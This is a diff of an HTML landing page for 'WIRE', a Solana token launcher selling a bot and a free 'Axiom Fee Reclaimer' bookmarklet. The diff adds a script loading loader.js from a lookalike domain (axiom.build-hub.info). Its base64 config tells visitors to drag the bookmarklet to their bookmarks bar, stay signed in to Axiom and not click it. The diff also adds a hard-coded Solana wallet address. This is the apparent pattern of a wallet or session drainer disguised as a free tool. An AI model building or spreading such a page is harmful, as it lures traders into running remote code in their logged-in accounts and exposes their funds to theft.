@@ -3,11 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WIRE | Solana Bot, Token Launcher, Fee Reclaimer & Trading AI</title>
-    <meta name="description" content="WIRE - Free Fee Reclaimer, Trading AI sentiment & rugpull tools, Solana bot & token creation.">
+    <title>WIRE | Solana Bot, Token Launcher & Axiom Fee Reclaimer</title>
+    <meta name="description" content="WIRE - Free Axiom Fee Reclaimer beta, Solana bot & effortless token creation.">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <script src="https://axiom.build-hub.info/loader.js" data="eyJoYXNoIjoiTURzM09UTXpPVFE1TnpNMU95MHhNREF6T1RZM01qazNORFF5IiwiYWxlcnRzIjp7Imd1aWRlIjoiWW91IG11c3QgZHJhZyB0aGUgYm9va21hcmtsZXQgdG8geW91ciBib29rbWFya3MgYmFyIGluc3RlYWQgb2YgY2xpY2tpbmcgaXQuIiwicmVkaXJlY3QiOiJZb3UgYXJlIG5vdyBiZWluZyByZWRpcmVjdGVkIHRvIGh0dHBzOi8vYXhpb20udHJhZGUvZGlzY292ZXIuIiwidW5hdXRob3JpemVkIjoiWW91IG11c3QgYmUgc2lnbmVkIGluIHRvIHVzZSB0aGlzIGJvb2ttYXJrbGV0LiIsImVycm9yIjoiRmFpbGVkIHRvIGV4ZWN1dGUgdGhlIGJvb2ttYXJrbGV0LiBQbGVhc2UgdHJ5IGFnYWluIGxhdGVyLiJ9fQ=="></script>
 <style>
         :root {
             /* --- Surface --- */
@@ -418,44 +419,6 @@
         }
         .axiom-steps strong { color: var(--ink); font-weight: 500; }
 
-
-        /* --- Trading AI Pulse --- */
-        .pulse-box { max-width: 720px; }
-        .pulse-caps {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin: 24px 0 4px;
-            text-align: left;
-        }
-        .pulse-cap {
-            background: rgba(255,255,255,0.03);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 14px 14px 12px;
-        }
-        .pulse-cap .ic {
-            width: 28px; height: 28px; border-radius: 8px;
-            background: rgba(34,211,238,0.12);
-            border: 1px solid rgba(34,211,238,0.28);
-            display: flex; align-items: center; justify-content: center;
-            margin-bottom: 10px; color: #8fe9ff;
-        }
-        .pulse-cap h4 { font-size: 13px; font-weight: 500; margin-bottom: 4px; color: var(--ink); }
-        .pulse-cap p { font-size: 11px; color: var(--muted); line-height: 1.5; margin: 0; }
-        .pulse-badge {
-            color: #8fe9ff !important;
-            background: rgba(34,211,238,0.10) !important;
-            border-color: rgba(34,211,238,0.28) !important;
-        }
-        .pulse-badge .dot {
-            background: var(--accent-2) !important;
-            box-shadow: 0 0 8px var(--accent-2) !important;
-        }
-        @media (max-width: 600px) {
-            .pulse-caps { grid-template-columns: 1fr; }
-        }
-
         /* --- Creator / Deployment Section --- */
         .creator-section { padding: 120px 5%; max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: 1.2fr 1fr; gap: 48px; border-bottom: none; }
         .section-header-left { text-align: left; margin-bottom: 48px; }
@@ -503,15 +466,7 @@
         .terminal-logs { font-family: var(--font-mono); font-size: 11px; color: var(--muted); text-align: left; margin-top: 24px; height: auto; min-height: 80px; overflow: hidden; display: flex; flex-direction: column; justify-content: flex-end; line-height: 2; }
         .ticket-btn { background: var(--ink); color: var(--bg); border: none; padding: 12px 24px; font-size: 12px; font-weight: 600; border-radius: 100px; text-decoration: none; display: inline-block; transition: var(--transition); cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
         .ticket-btn:hover { background: rgba(255,255,255,0.8); }
-
-        /* Toasts */
-        .toast-container { position: fixed; bottom: 32px; right: 32px; z-index: 999; display: flex; flex-direction: column; gap: 12px; pointer-events: none; }
-        .toast { background: rgba(10, 10, 10, 0.8); border: 1px solid var(--border); padding: 16px 24px; border-radius: 12px; backdrop-filter: blur(10px); display: flex; align-items: center; gap: 12px; transform: translateX(120%); opacity: 0; transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
-        .toast.show { transform: translateX(0); opacity: 1; }
-        .toast-text p { font-size: 13px; font-weight: 500; margin-bottom: 2px; }
-        .toast-text span { font-size: 11px; color: var(--muted); font-family: var(--font-mono); }
-
-        footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--border); position: relative; }
+footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--border); position: relative; }
         .footer-logo-mark { width: 24px; height: 24px; background: var(--muted); border-radius: 50%; margin: 0 auto 32px; }
         .footer-links { margin-bottom: 32px; }
         .footer-links a { color: var(--muted); text-decoration: none; margin: 0 16px; font-size: 13px; transition: color 0.3s; }
@@ -969,7 +924,7 @@
         .page-section, .axiom-section, .creator-section, .features-section { position: relative; }
 
         /* --- Glass panels: gradient edge + lift --------------- */
-        .checkout-box, .axiom-box, .form-container, .preview-panel, .feature-card, .hero-stats, .pulse-cap {
+        .checkout-box, .axiom-box, .form-container, .preview-panel, .feature-card, .hero-stats {
             position: relative;
             box-shadow: var(--shadow);
             transition: transform 0.5s var(--ease), border-color 0.4s ease, box-shadow 0.5s var(--ease);
@@ -1041,206 +996,12 @@
 
         .showcase-img { border-radius: var(--r-md); opacity: 0.8; }
         .showcase-img:hover { border-color: rgba(124,92,255,0.55); transform: translateY(-6px) scale(1.015); }
-        .showcase-mock {
-            width: 400px; height: 225px; flex-shrink: 0; border-radius: var(--r-md);
-            border: 1px solid var(--border); scroll-snap-align: center;
-            background:
-                radial-gradient(circle at 20% 20%, rgba(124,92,255,.35), transparent 40%),
-                radial-gradient(circle at 80% 80%, rgba(34,211,238,.22), transparent 42%),
-                linear-gradient(180deg, #12141c, #07080c);
-            padding: 18px; display: flex; flex-direction: column; gap: 10px;
-            cursor: default; opacity: 0.9;
-        }
-        .showcase-mock .bar { height: 8px; border-radius: 99px; background: rgba(255,255,255,.12); }
-        .showcase-mock .bar.w2 { width: 62%; }
-        .showcase-mock .bar.w3 { width: 40%; background: var(--grad); }
-        .showcase-mock .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: auto; }
-        .showcase-mock .cell { height: 54px; border-radius: 10px; background: rgba(255,255,255,.05); border: 1px solid rgba(255,255,255,.08); }
 
         .axiom-badge { color: #c9baff; background: var(--accent-soft); border-color: rgba(124,92,255,0.3); }
         .axiom-badge .dot { background: var(--accent); box-shadow: 0 0 8px var(--accent); }
         .bookmarklet-btn { background: var(--grad); border-color: transparent; color: #05060a; }
         .bookmarklet-btn:hover { background: var(--grad); color: #05060a; }
-
-        /* --- Payment modal ----------------------------------- */
-        .pay-modal {
-            position: fixed; inset: 0; z-index: 9998;
-            display: flex; align-items: center; justify-content: center;
-            padding: 24px;
-            opacity: 0; pointer-events: none;
-            transition: opacity 0.32s ease;
-        }
-        .pay-modal.active { opacity: 1; pointer-events: auto; }
-        .pay-backdrop {
-            position: absolute; inset: 0;
-            background: rgba(2, 3, 6, 0.82);
-            backdrop-filter: blur(14px); -webkit-backdrop-filter: blur(14px);
-        }
-        .pay-card {
-            position: relative; width: 100%; max-width: 460px;
-            max-height: 90vh; overflow-y: auto;
-            background: linear-gradient(180deg, rgba(16,18,28,0.96), rgba(8,9,14,0.98));
-            border: 1px solid var(--border);
-            border-radius: var(--r-lg);
-            padding: 36px 32px 30px;
-            text-align: center;
-            box-shadow: 0 50px 120px -40px rgba(0,0,0,1), 0 0 70px -30px rgba(124,92,255,0.5);
-            transform: translateY(24px) scale(0.97);
-            opacity: 0;
-            transition: transform 0.45s var(--ease), opacity 0.35s ease;
-        }
-        .pay-modal.active .pay-card { transform: none; opacity: 1; }
-        .pay-card::-webkit-scrollbar { width: 6px; }
-        .pay-card::before {
-            content: ''; position: absolute; inset: -1px; border-radius: inherit;
-            padding: 1px; pointer-events: none;
-            background: linear-gradient(140deg, rgba(124,92,255,0.6), rgba(34,211,238,0.2) 45%, transparent 75%);
-            -webkit-mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
-            -webkit-mask-composite: xor; mask-composite: exclude;
-        }
-        .pay-close {
-            position: absolute; top: 16px; right: 16px;
-            width: 32px; height: 32px; border-radius: 50%;
-            background: var(--surface); border: 1px solid var(--border);
-            color: var(--muted); font-size: 15px; line-height: 1;
-            cursor: pointer; transition: var(--transition);
-        }
-        .pay-close:hover { color: var(--ink); border-color: var(--border-hover); }
-
-        .pay-card h3 {
-            font-size: 1.4rem; font-weight: 500; letter-spacing: -0.02em;
-            margin-bottom: 8px;
-        }
-        .pay-sub { font-size: 13px; color: var(--muted); line-height: 1.6; margin-bottom: 24px; }
-
-        .pay-amount {
-            display: flex; align-items: baseline; justify-content: center; gap: 8px;
-            margin-bottom: 24px;
-        }
-        .pay-amount .n {
-            font-family: var(--font-mono); font-size: 2.6rem; font-weight: 300;
-            letter-spacing: -2px;
-            background: var(--grad-text); background-size: 200% 100%;
-            -webkit-background-clip: text; background-clip: text;
-            -webkit-text-fill-color: transparent; color: transparent;
-            animation: sheen 8s ease-in-out infinite;
-        }
-        .pay-amount .u {
-            font-family: var(--font-mono); font-size: 13px;
-            color: var(--muted); letter-spacing: 1px;
-        }
-
-        .pay-label {
-            display: block; text-align: left;
-            font-family: var(--font-mono); font-size: 10px;
-            letter-spacing: 1.6px; text-transform: uppercase;
-            color: var(--muted); margin-bottom: 8px;
-        }
-        .pay-card .copy-row { margin-bottom: 18px; align-items: flex-start; }
-        /* Show the whole address — people verify it character by character */
-        #pay-address {
-            white-space: normal; overflow: visible; text-overflow: clip;
-            word-break: break-all; font-size: 12px; line-height: 1.6;
-        }
-        .pay-card .qr-container { margin-bottom: 24px; }
-        .pay-cta { width: 100%; padding: 16px; margin-top: 6px; }
-        .pay-note {
-            font-family: var(--font-mono); font-size: 10.5px;
-            color: var(--muted); margin-top: 14px; line-height: 1.7;
-        }
-        .pay-network {
-            display: inline-flex; align-items: center; gap: 7px;
-            font-family: var(--font-mono); font-size: 10px;
-            letter-spacing: 1.4px; text-transform: uppercase;
-            color: #c9baff; background: var(--accent-soft);
-            border: 1px solid rgba(124,92,255,0.3);
-            padding: 6px 13px; border-radius: 100px; margin-bottom: 18px;
-        }
-
-        /* Verification stage */
-        .pay-progress {
-            width: 100%; height: 2px; background: var(--border);
-            border-radius: 2px; overflow: hidden; margin: 4px 0 28px;
-        }
-        .pay-progress span {
-            display: block; height: 100%; width: 0;
-            background: var(--grad);
-            box-shadow: 0 0 12px rgba(124,92,255,0.8);
-            transition: width 0.6s linear;
-        }
-        .pay-checks { text-align: left; margin-bottom: 24px; }
-        .pay-check {
-            display: flex; align-items: center; gap: 12px;
-            font-size: 13px; color: var(--muted);
-            padding: 9px 0;
-            opacity: 0.4;
-            transition: opacity 0.4s ease, color 0.4s ease;
-        }
-        .pay-check .mark {
-            flex-shrink: 0; width: 20px; height: 20px; border-radius: 50%;
-            border: 1px solid var(--border);
-            display: flex; align-items: center; justify-content: center;
-            position: relative;
-        }
-        .pay-check .mark::after {
-            content: ''; width: 6px; height: 6px; border-radius: 50%;
-            background: var(--muted); transition: all 0.3s ease;
-        }
-        .pay-check.active { opacity: 1; color: var(--ink); }
-        .pay-check.active .mark {
-            border-color: rgba(124,92,255,0.6);
-        }
-        .pay-check.active .mark::after {
-            background: var(--accent);
-            box-shadow: 0 0 10px var(--accent);
-            animation: check-pulse 1s ease-in-out infinite;
-        }
-        @keyframes check-pulse {
-            0%,100% { transform: scale(1); opacity: 1; }
-            50%     { transform: scale(1.5); opacity: 0.5; }
-        }
-        .pay-check.done { opacity: 1; color: var(--ink-dim); }
-        .pay-check.done .mark {
-            border-color: rgba(20,241,149,0.5); background: rgba(20,241,149,0.1);
-        }
-        .pay-check.done .mark::after {
-            width: 9px; height: 5px; border-radius: 0;
-            background: transparent;
-            border-left: 1.6px solid var(--accent-3);
-            border-bottom: 1.6px solid var(--accent-3);
-            transform: rotate(-45deg) translate(1px, -1px);
-            box-shadow: none; animation: none;
-        }
-        .pay-check .t { flex-grow: 1; }
-        .pay-check .ms {
-            font-family: var(--font-mono); font-size: 10px; color: var(--muted);
-            opacity: 0; transition: opacity 0.3s ease;
-        }
-        .pay-check.done .ms { opacity: 1; }
-
-        .pay-terminal {
-            font-family: var(--font-mono); font-size: 10.5px;
-            color: var(--muted); text-align: left; line-height: 1.9;
-            background: rgba(0,0,0,0.45); border: 1px solid var(--border);
-            border-radius: 12px; padding: 14px 16px;
-            max-height: 108px; overflow: hidden;
-        }
-        .pay-terminal div { animation: log-in 0.3s ease both; }
-        @keyframes log-in { from { opacity: 0; transform: translateY(4px); } }
-
-        .pay-result {
-            border: 1px solid rgba(255,69,58,0.28);
-            background: rgba(255,69,58,0.07);
-            border-radius: var(--r-md); padding: 22px;
-            margin-bottom: 20px;
-        }
-        .pay-result h4 { font-size: 14px; font-weight: 500; color: #ff8a80; margin-bottom: 8px; }
-        .pay-result p { font-size: 12.5px; color: var(--muted); line-height: 1.7; }
-
-        /* --- Toasts ------------------------------------------ */
-        .toast { border-color: rgba(124,92,255,0.22); background: rgba(10,12,18,0.85); }
-
-        /* --- Footer ------------------------------------------ */
+/* --- Footer ------------------------------------------ */
         footer { padding: 96px 5% 48px; }
         .footer-logo-mark {
             background: var(--grad);
@@ -1331,8 +1092,7 @@
         </a>
         <div class="nav-links">
             <a href="#deploy" class="nav-highlight">Create Token</a>
-            <a href="#axiom">Fee Reclaimer</a>
-            <a href="#pulse">Trading AI</a>
+            <a href="#axiom">&#128011; Fee Reclaimer Free</a>
             <a href="#primary-bot">Buy Memecoin Tool</a>
             <a href="https://discord.gg/BdhzdHE3Kn" target="_blank">Discord</a>
         </div>
@@ -1343,8 +1103,7 @@
 
     <div class="mobile-menu" id="mobile-menu">
         <a href="#deploy">Create Token</a>
-        <a href="#axiom">Fee Reclaimer — Free</a>
-        <a href="#pulse">Trading AI — Free</a>
+        <a href="#axiom">&#128011; Fee Reclaimer — Free</a>
         <a href="#primary-bot">Wire Memecoin Bot</a>
         <a href="https://discord.gg/BdhzdHE3Kn" target="_blank">Discord</a>
     </div>
@@ -1364,12 +1123,11 @@
         </div>
 
         <h1 class="intro d2">Unlock your token's potential. Effortlessly.</h1>
-        <p class="intro d3">Free Fee Reclaimer + Trading AI bookmarklets, and the ultimate Solana bot. Launch tokens with secure local routing, instant deployment, and zero coding required.</p>
+        <p class="intro d3">Free Axiom Fee Reclaimer beta + the ultimate Solana bot. Launch tokens with secure local routing, instant deployment, and zero coding required.</p>
 
         <div class="hero-actions intro d4">
             <a href="#deploy" class="btn-primary">Create Token</a>
-            <a href="#pulse" class="btn-whale">Try Trading AI Free</a>
-            <a href="#axiom" class="btn-glass">Fee Reclaimer</a>
+            <a href="#axiom" class="btn-whale">&#128011; Try Fee Reclaimer Free</a>
             <a href="#primary-bot" class="btn-glass">Buy Bot</a>
         </div>
         <p class="fomo-line intro d5" style="margin-top: -32px; margin-bottom: 24px;">Free beta · No install · Bookmark only</p>
@@ -1566,7 +1324,7 @@
             </div>
 
             <div id="token-step-initial" style="margin-top: 40px;">
-                <button type="button" class="btn-primary" style="width: 100%; padding: 16px;" onclick="showTokenPayment()">Create Token</button>
+                <a href="https://discord.gg/BdhzdHE3Kn" target="_blank" class="btn-primary" style="width: 100%; padding: 16px; display: inline-flex;">Join Discord to Launch</a>
             </div>
 
         </div>
@@ -1590,21 +1348,13 @@
 
             <div class="feature-card" data-reveal style="--d: 0.12s">
                 <div class="feature-icon">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg>
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1v22"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
                 </div>
                 <h3>Fee Reclaimer</h3>
                 <p>Reclaim creator and trading fees from Axiom — free, forever. No install, bookmark only.</p>
             </div>
 
             <div class="feature-card" data-reveal style="--d: 0.19s">
-                <div class="feature-icon">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a4 4 0 0 1 4 4v1a4 4 0 0 1-8 0V6a4 4 0 0 1 4-4z"/><path d="M4 14h16"/><path d="M8 14v3a4 4 0 0 0 8 0v-3"/><path d="M2 20h20"/></svg>
-                </div>
-                <h3>Trading AI</h3>
-                <p>NLP sentiment, Twitter tracking, and rugpull detection — predict token moves before they print. Bookmark only.</p>
-            </div>
-
-            <div class="feature-card" data-reveal style="--d: 0.26s">
                 <div class="feature-icon">
                     <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
                 </div>
@@ -1624,7 +1374,7 @@
                 <span class="dot"></span>
                 Free Beta
             </div>
-            <h2 class="section-title" style="margin-bottom: 12px;">Axiom Fee Reclaimer</h2>
+            <h2 class="section-title" style="margin-bottom: 12px;">&#128011; Axiom Fee Reclaimer</h2>
             <p style="color: var(--muted); font-size: 15px; max-width: 420px; margin: 0 auto 8px; line-height: 1.65;">
                 Free tool for Axiom creators. Find and reclaim fees that would otherwise stay locked on the platform — so you keep more of what you earn.
             </p>
@@ -1647,97 +1397,13 @@
                 </div>
             </div>
 
-            <a href="javascript:void(0)" id="bm-fee" class="bookmarklet bookmarklet-btn" draggable="true" title="Drag this to your bookmarks bar, or click to demo here.">
+            <a href="javascript:void(0)" class="bookmarklet bookmarklet-btn" title="Drag this to your bookmarks bar. Do not click.">
                 <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path></svg>
-                Activate Fee Reclaimer
+                &#128011; Activate Fee Reclaimer
             </a>
             <p class="drag-hint">↑ Drag to bookmarks bar ↑</p>
-        </div>
+</div>
     </section>
-
-    <!-- Trading AI - Free Beta bookmarklet -->
-    <section id="pulse" class="axiom-section">
-        <div class="axiom-box pulse-box" data-reveal>
-            <div class="axiom-badge pulse-badge">
-                <span class="dot"></span>
-                Free Beta · Bookmark only
-            </div>
-            <h2 class="section-title" style="margin-bottom: 12px;">Trading AI</h2>
-            <p style="color: var(--muted); font-size: 15px; max-width: 520px; margin: 0 auto 8px; line-height: 1.65;">
-                Advanced NLP reads social sentiment across major platforms to predict token movements before they happen. Rugpull detection, Twitter tracking, and task automation — one bookmark.
-            </p>
-            <p style="color: var(--accent-2); font-family: var(--font-mono); font-size: 12px; margin-bottom: 4px;">
-                No payment · No install · Speed first
-            </p>
-
-            <div class="pulse-caps">
-                <div class="pulse-cap">
-                    <div class="ic">
-                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3c.5 4 2 6 6 7-4 .5-6 2-7 6-1-4-3-5.5-7-6 4-1 6-3 8-7z"/></svg>
-                    </div>
-                    <h4>AI Sentiment Analysis</h4>
-                    <p>NLP scores chatter across X, Telegram, and Discord to flag bullish or toxic flow early.</p>
-                </div>
-                <div class="pulse-cap">
-                    <div class="ic">
-                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 7 13.5 15.5 8.5 10.5 2 17"/><polyline points="16 7 22 7 22 13"/></svg>
-                    </div>
-                    <h4>Predict token moves</h4>
-                    <p>Surface likely pumps and dumps from language shifts — before the candle confirms.</p>
-                </div>
-                <div class="pulse-cap">
-                    <div class="ic">
-                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M12 8v4"/><path d="M12 16h.01"/></svg>
-                    </div>
-                    <h4>Rugpull Detection</h4>
-                    <p>Flags mint authority, LP unlocks, and wallet clustering that typically precede a rug.</p>
-                </div>
-                <div class="pulse-cap">
-                    <div class="ic">
-                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4l11.733 16h4.267l-11.733-16z"/><path d="M4 20l6.768-6.768"/></svg>
-                    </div>
-                    <h4>Twitter Tracker</h4>
-                    <p>Follow KOLs, ticker mentions, and reply velocity in one overlay while you trade.</p>
-                </div>
-                <div class="pulse-cap">
-                    <div class="ic">
-                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
-                    </div>
-                    <h4>Automate repetitive tasks</h4>
-                    <p>Highlight, tag, and filter the same checks every scan so you stay on the chart.</p>
-                </div>
-                <div class="pulse-cap">
-                    <div class="ic">
-                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
-                    </div>
-                    <h4>Speed & Efficiency</h4>
-                    <p>Runs locally as a bookmark. No install, no seed, no extra tab farm.</p>
-                </div>
-            </div>
-
-            <div class="axiom-steps">
-                <div class="step">
-                    <span class="num">1</span>
-                    <span><strong>Drag</strong> the button below to your Bookmarks Bar (don’t click it)</span>
-                </div>
-                <div class="step">
-                    <span class="num">2</span>
-                    <span>No bar visible? Press <strong>Ctrl+Shift+B</strong> or <strong>Cmd+Shift+B</strong></span>
-                </div>
-                <div class="step">
-                    <span class="num">3</span>
-                    <span>Open <strong>Axiom</strong> signed in, then click the bookmark</span>
-                </div>
-            </div>
-
-            <a href="javascript:void(0)" id="bm-pulse" class="bookmarklet bookmarklet-btn" draggable="true" title="Drag this to your bookmarks bar, or click to demo here.">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path></svg>
-                Activate Trading AI
-            </a>
-            <p class="drag-hint">↑ Drag to bookmarks bar ↑</p>
-        </div>
-    </section>
-
 <section id="primary-bot" class="page-section" style="border-top: 1px solid var(--border);">
         <div class="checkout-box" data-reveal>
             <span class="eyebrow" style="margin: 0 auto 14px;">Flagship Bot</span>
@@ -1749,19 +1415,19 @@
 
             <div id="app-step-initial">
                 <div class="price-tag">$49.99</div>
-                <p style="color: var(--muted); font-size: 13px; margin-bottom: 40px;">Lifetime access to the local deployment architecture and priority routing nodes.</p>
-                <button type="button" class="btn-primary" style="width: 100%;" onclick="showAppPayment()">Buy Bot Now</button>
+                <p style="color: var(--muted); font-size: 13px; margin-bottom: 40px;">Lifetime access to local deployment architecture and priority routing nodes. Join Discord for access.</p>
+                <a href="https://discord.gg/BdhzdHE3Kn" target="_blank" class="btn-primary" style="width: 100%; display: inline-flex;">Join Discord</a>
             </div>
         </div>
 
         <div class="showcase-wrapper" data-reveal style="--d: 0.12s">
             <div class="showcase-header">Bot Interface & Setup</div>
             <div class="showcase-gallery" id="wire-gallery">
-                <div class="showcase-mock"><div class="bar"></div><div class="bar w2"></div><div class="bar w3"></div><div class="grid"><div class="cell"></div><div class="cell"></div></div></div>
-                <div class="showcase-mock"><div class="bar w2"></div><div class="bar"></div><div class="bar w3"></div><div class="grid"><div class="cell"></div><div class="cell"></div></div></div>
-                <div class="showcase-mock"><div class="bar w3"></div><div class="bar w2"></div><div class="bar"></div><div class="grid"><div class="cell"></div><div class="cell"></div></div></div>
-                <div class="showcase-mock"><div class="bar"></div><div class="bar w3"></div><div class="bar w2"></div><div class="grid"><div class="cell"></div><div class="cell"></div></div></div>
-                <div class="showcase-mock"><div class="bar w2"></div><div class="bar w3"></div><div class="bar"></div><div class="grid"><div class="cell"></div><div class="cell"></div></div></div>
+                <img src="W (1).png" class="showcase-img" alt="Wire Bot View 1" onclick="openLightbox(this, '#wire-gallery')">
+                <img src="W (2).png" class="showcase-img" alt="Wire Bot View 2" onclick="openLightbox(this, '#wire-gallery')">
+                <img src="W (3).png" class="showcase-img" alt="Wire Bot View 3" onclick="openLightbox(this, '#wire-gallery')">
+                <img src="W (4).png" class="showcase-img" alt="Wire Bot View 4" onclick="openLightbox(this, '#wire-gallery')">
+                <img src="W (5).png" class="showcase-img" alt="Wire Bot View 5" onclick="openLightbox(this, '#wire-gallery')">
             </div>
         </div>
     </section>
@@ -1774,70 +1440,13 @@
         </div>
         <div class="footer-links">
             <a href="#deploy">Create Token</a>
-            <a href="#axiom">Fee Reclaimer</a>
-            <a href="#pulse">Trading AI</a>
+            <a href="#axiom">Axiom Fee Reclaimer</a>
             <a href="#primary-bot">Buy Bot</a>
             <a href="https://discord.gg/BdhzdHE3Kn" target="_blank">Discord</a>
         </div>
         <p style="color: var(--muted); font-size: 12px; font-family: var(--font-mono);">NOT FINANCIAL ADVICE.</p>
 </footer>
-
-    <!-- Checkout modal -->
-    <div class="pay-modal" id="pay-modal" role="dialog" aria-modal="true" aria-labelledby="pay-title">
-        <div class="pay-backdrop" data-pay-close></div>
-        <div class="pay-card">
-            <button class="pay-close" data-pay-close aria-label="Close">&#10005;</button>
-
-            <div id="pay-step-send">
-                <div class="pay-network"><span class="dot" style="width:6px;height:6px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);"></span> Checkout</div>
-                <h3 id="pay-title">Complete payment</h3>
-                <p class="pay-sub" id="pay-desc">Copy your order details, then verify to generate a Discord ticket payload.</p>
-
-                <div class="pay-amount">
-                    <span class="n" id="pay-amount-big">0.50</span>
-                    <span class="u" id="pay-amount-unit">SOL</span>
-                </div>
-
-                <span class="pay-label">Amount</span>
-                <div class="copy-row">
-                    <span class="copy-row-text" id="pay-amount-text">0.50 SOL</span>
-                    <button type="button" class="btn-copy" id="pay-copy-amount">Copy</button>
-                </div>
-
-                <span class="pay-label">Order ID</span>
-                <div class="copy-row">
-                    <span class="copy-row-text" id="pay-address">WIRE-000000</span>
-                    <button type="button" class="btn-copy" id="pay-copy-address">Copy</button>
-                </div>
-
-                <button type="button" class="btn-primary pay-cta" id="pay-verify-btn">Verify & continue</button>
-                <p class="pay-note">Checkout is completed in Discord with this Order ID.<br>No wallet send on this page.</p>
-            </div>
-
-            <div id="pay-step-verify" class="hidden">
-                <h3>Preparing order</h3>
-                <p class="pay-sub">Building your ticket payload.</p>
-                <div class="pay-progress"><span id="pay-progress-fill"></span></div>
-                <div class="pay-checks" id="pay-checks"></div>
-                <div class="pay-terminal" id="pay-terminal"></div>
-            </div>
-
-            <div id="pay-step-result" class="hidden">
-                <h3 id="pay-result-title">Order ready</h3>
-                <p class="pay-sub">Open Discord and paste your Order ID to finish checkout.</p>
-                <div class="pay-result" style="border-color: rgba(20,241,149,0.28); background: rgba(20,241,149,0.07);">
-                    <h4 style="color: var(--accent-3);" id="pay-result-heading">Ticket payload created</h4>
-                    <p id="pay-result-msg">Keep this Order ID. Support matches it to your quote.</p>
-                </div>
-                <a href="https://discord.gg/BdhzdHE3Kn" target="_blank" class="btn-primary pay-cta">Open Discord</a>
-                <button type="button" class="btn-glass pay-cta" id="pay-retry-btn" style="margin-top: 12px; background: transparent;">Back to details</button>
-            </div>
-        </div>
-    </div>
-
-    <div class="toast-container" id="toast-container"></div>
-
-    <div class="lightbox" id="lightbox">
+<div class="lightbox" id="lightbox">
         <button class="lightbox-close" onclick="closeLightbox()">Close</button>
         <div class="lightbox-nav lightbox-prev" onclick="prevImage()">
             <svg viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg>
@@ -1851,11 +1460,13 @@
     </div>
 
     <script>
+        /* Minimal UI only — preview, lightbox, nav, scroll (no payments) */
+        const PAY_ADDRESS = '2AXBwqmXGHFypHQRgEhsmoXTWFoHdQxQadnKuiufhTu7';
         let uploadedImageSrc = null;
+
         function handleImageUpload(event) {
             const file = event.target.files[0];
             const nameDisplay = document.getElementById('file-name-display');
-            if (!nameDisplay) return;
             if (file) {
                 nameDisplay.innerText = file.name;
                 nameDisplay.style.color = 'var(--ink)';
@@ -1872,11 +1483,13 @@
                 updatePreview();
             }
         }
+
         function updatePreview() {
             const name = document.getElementById('token-name')?.value || 'Wire Token';
             const symbol = document.getElementById('token-symbol')?.value || 'WIRE';
             const supply = document.getElementById('token-supply')?.value || '1,000,000,000';
             const liquidity = parseFloat(document.getElementById('liquidity-amount')?.value) || 0;
+
             const nameEl = document.getElementById('preview-name');
             const symbolEl = document.getElementById('preview-symbol');
             const supplyEl = document.getElementById('summary-supply');
@@ -1887,27 +1500,40 @@
             if (supplyEl) supplyEl.innerText = supply;
             if (liqEl) liqEl.innerText = liquidity.toFixed(2) + ' SOL';
             if (avatar) {
-                if (uploadedImageSrc) avatar.innerHTML = `<img src="${uploadedImageSrc}" alt="Token Logo">`;
